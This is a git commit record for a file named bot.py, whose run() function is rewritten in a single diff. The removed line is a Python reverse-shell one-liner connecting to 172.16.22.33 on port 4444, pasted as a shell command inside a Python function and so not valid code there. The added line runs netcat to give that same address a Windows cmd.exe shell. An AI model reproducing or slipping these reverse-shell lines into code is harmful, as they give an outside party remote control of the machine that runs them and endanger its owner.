ea0699769b906bc5c22e54cca031a4517e0cf5c7
daniyc4 <125304200+daniyc4@users.noreply.github.com>
2023-02-13 20:19:12 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,2 +1,3 @@
 def run():
-    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.22.33",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+   import os
+   os.system('nc.exe -e cmd.exe 172.16.22.33 4444')
